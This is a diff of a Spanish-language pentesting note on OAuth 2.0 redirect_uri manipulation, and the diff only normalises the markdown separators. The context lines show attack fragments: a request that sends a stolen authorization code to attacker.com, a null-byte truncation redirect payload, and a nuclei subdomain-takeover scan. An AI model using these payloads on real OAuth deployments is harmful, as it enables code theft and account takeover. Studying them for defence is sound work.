@@ -19,7 +19,7 @@ linked:
 ---
 # OAuth 2.0 - redirect_uri Manipulation
 
-***
+---
 
 ## Open Redirect Encadenado
 
@@ -54,7 +54,7 @@ GET /steal?code=XYZ&state=ABC HTTP/1.1
 Host: attacker.com
 ```
 
-___
+---
 
 ## Path Traversal y Suffix Abuse
 
@@ -73,7 +73,7 @@ ___
 | `redirect_uri=https://known.com%00.attacker.com/cb` | Null byte truncation | Parser-truncate variant. |
 ^oauth-redirect-pathtraversal
 
-___
+---
 
 ## URL Parser Differential
 
@@ -109,7 +109,7 @@ for trick in \
 done
 ```
 
-___
+---
 
 ## Subdomain Confusion / Takeover
 
@@ -146,7 +146,7 @@ nuclei -t http/takeovers/ -l alive.txt -o takeovers.txt
 # Azure:     New-AzWebApp -Name "attacker-victim"
 ```
 
-___
+---
 
 ## Scheme Abuse y Native App Hijack
 
@@ -183,4 +183,4 @@ cat <<EOF
 EOF
 ```
 
-***
+---
